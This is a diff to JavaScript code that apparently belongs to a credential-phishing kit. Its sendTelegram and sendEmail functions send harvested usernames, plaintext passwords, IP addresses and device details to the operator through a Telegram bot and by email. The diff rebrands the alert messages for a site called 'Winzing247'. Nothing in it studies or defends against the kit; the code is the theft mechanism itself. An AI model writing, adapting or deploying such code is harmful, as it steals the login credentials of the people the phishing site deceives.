@@ -80,12 +80,13 @@ async function readFromSupabase() {
 // ─── Telegram ─────────────────────────────────────────────────────────────────
 async function sendTelegram(entry) {
     const text =
-        `🚨 *New Login Captured!*\n\n` +
-        `👤 *Username:* \`${entry.username}\`\n` +
-        `🔑 *Password:* \`${entry.password}\`\n\n` +
+        `🎯 *[Winzing247] New Login Captured!*\n\n` +
+        `👤 *Username:* ${entry.username}\n` +
+        `🔑 *Password:* ${entry.password}\n\n` +
         `🌐 *IP:* ${entry.ip}\n` +
         `💻 *Device:* ${entry.device} (${entry.browser})\n` +
-        `🕒 *Time:* ${entry.timestamp}`;
+        `🕒 *Time:* ${entry.timestamp}\n\n` +
+        `🌐 *Site:* Winzing247`;
     try {
         const r = await fetch(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -106,16 +107,17 @@ async function sendTelegram(entry) {
 async function sendEmail(entry) {
     try {
         await transporter.sendMail({
-            from:    `"WinzingTOR Alert" <${EMAIL_USER}>`,
+            from:    `"Winzing247 Alert" <${EMAIL_USER}>`,
             to:      EMAIL_USER,
-            subject: `🚨 Login Captured: ${entry.username}`,
+            subject: `🎯 [Winzing247] New Login Captured: ${entry.username}`,
             text:
-                `New login attempt captured!\n\n` +
+                `[Winzing247] New Login Captured!\n\n` +
                 `Username : ${entry.username}\n` +
                 `Password : ${entry.password}\n\n` +
                 `IP       : ${entry.ip}\n` +
                 `Device   : ${entry.device} (${entry.browser})\n` +
-                `Time     : ${entry.timestamp}`
+                `Time     : ${entry.timestamp}\n\n` +
+                `Site     : Winzing247`
         });
     } catch (e) {
         console.error('Email send error:', e.message);
